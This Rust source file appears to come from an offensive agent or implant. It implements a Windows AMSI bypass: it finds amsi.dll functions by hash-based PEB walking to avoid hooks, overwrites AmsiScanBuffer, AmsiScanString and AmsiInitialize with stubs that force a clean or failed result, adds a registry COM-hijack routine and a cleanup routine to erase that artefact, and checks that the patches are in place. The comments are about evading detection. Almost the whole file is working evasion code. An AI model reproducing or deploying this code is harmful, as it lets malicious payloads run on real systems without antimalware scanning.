// AMSI Defense
#[cfg(windows)]
use std::ptr;

/// Apply a single AMSI bypass strategy: in-process memory patching of
/// `AmsiScanBuffer`, `AmsiScanString`, and `AmsiInitialize`.
///
/// # Strategy selection
///
/// Three bypass strategies exist in this module:
///
/// 1. **Memory patch** (`apply_memory_patch` + `set_init_failed_flag`): patch
///    the target functions with short-circuit stubs (`xor eax,eax; ret` or
///    `mov eax, E_FAIL; ret`).  Volatile — survives only while the process runs.
///    No persistent artefact. ← **active**
///
/// 2. **COM hijack** (`apply_com_hijack`): write an HKCU registry key that
///    redirects AMSI's COM server to a nonexistent DLL so `AmsiInitialize`
///    fails.  Persistent — leaves a detectable IOC in the registry after
///    the agent exits.  Not applied here; registry artefacts are higher-risk
///    than in-process patches.
///
/// 3. **HWBP/VEH**: hardware-breakpoint + vectored-exception-handler bypass.
///    Stealthier than memory patching (no .text modification) but requires
///    a per-thread setup and interaction with the VEH chain.  Planned for a
///    future release.
///
/// Applying multiple strategies simultaneously increases the attack surface
/// and leaves more detectable artefacts. This function applies strategy 1 only.
#[cfg(windows)]
pub fn orchestrate_layers() -> bool {
    // Single strategy: volatile in-process memory patch.
    apply_memory_patch();
    set_init_failed_flag();
    true
}

#[cfg(not(windows))]
pub fn orchestrate_layers() -> bool {
    true
}

/// Patch AmsiScanBuffer in-process with `xor eax,eax; ret` to force AMSI_RESULT_CLEAN.
#[cfg(windows)]
fn apply_memory_patch() {
    use winapi::um::memoryapi::VirtualProtect;
    use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE};

    unsafe {
        // Use pe_resolve (PEB walk + hash) to avoid IAT-hookable GetModuleHandleW.
        // If amsi.dll is not already loaded, AMSI is not active and there is
        // nothing to patch.
        let amsi_hash = pe_resolve::hash_str(b"amsi.dll\0");
        let hmod_base = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
            Some(b) => b as winapi::shared::minwindef::HMODULE,
            None => {
                log::debug!("apply_memory_patch: amsi.dll not loaded — nothing to patch");
                return;
            }
        };
        let hmod = hmod_base as *mut winapi::ctypes::c_void;

        // Resolve AmsiScanBuffer via hash
        let scan_buf_hash = pe_resolve::hash_str(b"AmsiScanBuffer\0");
        let scan_buf = match pe_resolve::get_proc_address_by_hash(hmod_base as usize, scan_buf_hash)
        {
            Some(addr) => addr as *mut winapi::ctypes::c_void,
            None => {
                log::warn!("apply_memory_patch: AmsiScanBuffer not found");
                return;
            }
        };

        // xor eax, eax (0x31 0xC0) ; ret (0xC3)
        let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
        let mut old_protect: u32 = 0;
        if VirtualProtect(
            scan_buf as _,
            patch.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ) != 0
        {
            std::ptr::copy_nonoverlapping(patch.as_ptr(), scan_buf as *mut u8, patch.len());
            VirtualProtect(scan_buf as _, patch.len(), old_protect, &mut old_protect);
            log::debug!("apply_memory_patch: AmsiScanBuffer patched");
        } else {
            log::warn!(
                "apply_memory_patch: VirtualProtect failed: {}",
                winapi::um::errhandlingapi::GetLastError()
            );
        }

        // Also patch AmsiScanString
        let scan_str_hash = pe_resolve::hash_str(b"AmsiScanString\0");
        if let Some(scan_str_addr) =
            pe_resolve::get_proc_address_by_hash(hmod_base as usize, scan_str_hash)
        {
            let scan_str = scan_str_addr as *mut winapi::ctypes::c_void;
            let mut op: u32 = 0;
            if VirtualProtect(scan_str as _, patch.len(), PAGE_EXECUTE_READWRITE, &mut op) != 0 {
                std::ptr::copy_nonoverlapping(patch.as_ptr(), scan_str as *mut u8, patch.len());
                VirtualProtect(scan_str as _, patch.len(), op, &mut op);
            }
        }
        let _ = hmod;
    }
}

#[cfg(windows)]
fn apply_com_hijack() {
    use winapi::um::winreg::{RegCreateKeyExA, RegSetValueExA, HKEY_CURRENT_USER};

    let subkey =
        b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\\InprocServer32\0";
    // Point to a nonexistent path so AMSI COM initialisation fails cleanly (2.11)
    let default_val = b"C:\\Windows\\System32\\amsi_disabled.dll\0";

    unsafe {
        let mut hkey = ptr::null_mut();
        if RegCreateKeyExA(
            HKEY_CURRENT_USER,
            subkey.as_ptr() as _,
            0,
            ptr::null_mut(),
            0,
            winapi::um::winnt::KEY_WRITE,
            ptr::null_mut(),
            &mut hkey,
            ptr::null_mut(),
        ) == 0
        {
            RegSetValueExA(
                hkey,
                ptr::null(),
                0,
                winapi::um::winnt::REG_SZ,
                default_val.as_ptr(),
                (default_val.len() - 1) as u32,
            );
            winapi::um::winreg::RegCloseKey(hkey);
        }
    }
}

/// Remove the registry key created by `apply_com_hijack` to avoid leaving a
/// detectable COM-hijack artefact after the bypass is no longer needed.
#[cfg(windows)]
pub fn cleanup_com_hijack() {
    use winapi::um::winreg::{RegDeleteKeyA, HKEY_CURRENT_USER};
    // Delete leaf key first; parent keys are harmless to leave (they are empty
    // standard Windows registry nodes).
    let leaf =
        b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\\InprocServer32\0";
    let parent = b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\0";
    unsafe {
        RegDeleteKeyA(HKEY_CURRENT_USER, leaf.as_ptr() as _);
        RegDeleteKeyA(HKEY_CURRENT_USER, parent.as_ptr() as _);
    }
}

/// Set the g_AmsiContext initialization flag to indicate failure so any
/// AmsiInitialize call in the current process reports an error.
#[cfg(windows)]
fn set_init_failed_flag() {
    use winapi::um::memoryapi::VirtualProtect;

    unsafe {
        let amsi_hash = pe_resolve::hash_str(b"amsi.dll\0");
        let hmod_base = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
            Some(b) => b,
            None => return,
        };

        // AmsiInitialize is __fastcall on x64; the caller cleans the stack so
        // a single-byte RET (0xC3) is the correct return form.
        // mov eax, 0x80004005 ; ret  => B8 05 40 00 80 C3
        let init_hash = pe_resolve::hash_str(b"AmsiInitialize\0");
        let init_fn = match pe_resolve::get_proc_address_by_hash(hmod_base, init_hash) {
            Some(addr) => addr as *mut winapi::ctypes::c_void,
            None => return,
        };

        let patch: [u8; 6] = [
            0xB8, 0x05, 0x40, 0x00, 0x80, // mov eax, 0x80004005 (E_FAIL)
            0xC3, // ret
        ];
        let mut old: u32 = 0;
        if VirtualProtect(
            init_fn as _,
            patch.len(),
            winapi::um::winnt::PAGE_EXECUTE_READWRITE,
            &mut old,
        ) != 0
        {
            std::ptr::copy_nonoverlapping(patch.as_ptr(), init_fn as *mut u8, patch.len());
            VirtualProtect(init_fn as _, patch.len(), old, &mut old);
            log::debug!("set_init_failed_flag: AmsiInitialize patched to return E_FAIL");
        }
    }
}

/// Verify AMSI bypass by checking that all three patched functions
/// (AmsiScanBuffer, AmsiScanString, AmsiInitialize) start with the expected
/// patch bytes.
///
/// Returns `true` if amsi.dll is not loaded (trivially successful) or if
/// all three functions are confirmed patched.  Returns `false` if any
/// function's patch does not match.
#[cfg(windows)]
pub fn verify_bypass() -> bool {
    unsafe {
        let amsi_hash = pe_resolve::hash_str(b"amsi.dll\0");
        let hmod_base = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
            Some(b) => b,
            None => return true, // amsi.dll not loaded = bypass trivially successful
        };

        // Helper: resolve a function by hash and read `n` bytes from its entry.
        // Returns `None` if the function is not found (treated as OK).
        let resolve_bytes = |name_hash: u32, n: usize| -> Option<(Vec<u8>, *const u8)> {
            let addr = pe_resolve::get_proc_address_by_hash(hmod_base, name_hash)?;
            let ptr = addr as *const u8;
            Some((std::slice::from_raw_parts(ptr, n).to_vec(), ptr))
        };

        // ── AmsiScanBuffer ─────────────────────────────────────────────────
        // Patched with `xor eax,eax; ret` (31 C0 C3) — 3 bytes, but we read
        // 6 to also accept the `mov eax,0; ret` form (B8 00 00 00 00 C3).
        let scan_buf_hash = pe_resolve::hash_str(b"AmsiScanBuffer\0");
        if let Some((bytes, ptr)) = resolve_bytes(scan_buf_hash, 6) {
            let ok = (bytes[0] == 0x31 && bytes[1] == 0xC0 && bytes[2] == 0xC3) // xor eax,eax; ret
                || (bytes[0] == 0x33 && bytes[1] == 0xC0 && bytes[2] == 0xC3) // xor alt encoding; ret
                || (bytes[0] == 0xB8
                    && bytes[1] == 0x00
                    && bytes[2] == 0x00
                    && bytes[3] == 0x00
                    && bytes[4] == 0x00
                    && bytes[5] == 0xC3); // mov eax,0; ret
            if !ok {
                log::warn!(
                    "verify_bypass: AmsiScanBuffer not patched ({:02x} {:02x} {:02x} {:02x} {:02x} {:02x})",
                    bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]
                );
                return false;
            }
            let _ = ptr;
        }

        // ── AmsiScanString ─────────────────────────────────────────────────
        // Patched with `xor eax,eax; ret` (31 C0 C3) — same pattern.
        let scan_str_hash = pe_resolve::hash_str(b"AmsiScanString\0");
        if let Some((bytes, ptr)) = resolve_bytes(scan_str_hash, 6) {
            let ok = (bytes[0] == 0x31 && bytes[1] == 0xC0 && bytes[2] == 0xC3)
                || (bytes[0] == 0x33 && bytes[1] == 0xC0 && bytes[2] == 0xC3)
                || (bytes[0] == 0xB8
                    && bytes[1] == 0x00
                    && bytes[2] == 0x00
                    && bytes[3] == 0x00
                    && bytes[4] == 0x00
                    && bytes[5] == 0xC3);
            if !ok {
                log::warn!(
                    "verify_bypass: AmsiScanString not patched ({:02x} {:02x} {:02x} {:02x} {:02x} {:02x})",
                    bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]
                );
                return false;
            }
            let _ = ptr;
        }

        // ── AmsiInitialize ─────────────────────────────────────────────────
        // Patched with `mov eax, 0x80004005; ret`
        // (B8 05 40 00 80 C3) — 6 bytes.
        let init_hash = pe_resolve::hash_str(b"AmsiInitialize\0");
        if let Some((bytes, ptr)) = resolve_bytes(init_hash, 6) {
            let ok = bytes[0] == 0xB8
                && bytes[1] == 0x05
                && bytes[2] == 0x40
                && bytes[3] == 0x00
                && bytes[4] == 0x80
                && bytes[5] == 0xC3;
            if !ok {
                log::warn!(
                    "verify_bypass: AmsiInitialize not patched ({:02x} {:02x} {:02x} {:02x} {:02x} {:02x})",
                    bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]
                );
                return false;
            }
            let _ = ptr;
        }

        true
    }
}

#[cfg(not(windows))]
pub fn verify_bypass() -> bool {
    true
}
